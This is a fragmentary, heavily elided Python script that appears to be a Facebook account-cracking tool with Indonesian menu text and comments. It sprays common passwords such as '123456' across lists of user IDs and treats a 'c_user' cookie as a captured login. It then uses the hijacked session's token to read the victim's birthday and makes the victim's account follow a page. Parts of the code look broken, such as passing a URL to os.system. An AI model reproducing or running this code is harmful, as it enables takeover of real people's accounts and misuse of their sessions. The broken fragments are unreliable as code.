...
def Sad_Boy():
    ...
    if _Sad_Boy___ in ('2', '02'):
        os.system('https://facebook.com/groups/258862096423615/')
...
class __xxx__:
               ...
               'authority': 'm.facebook.com',
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        cp_ttl = session.get(f'https://www.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/link.chidaiya.lav.nai.abal.not', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://www.facebook.com' + str(get)), cookies={'cookie': coki}).text
                ...
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = ["123456"]
                            pwx = ["123456789"]
                        bxbworld.submit(self.__metode__, uid, pwx, "www.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
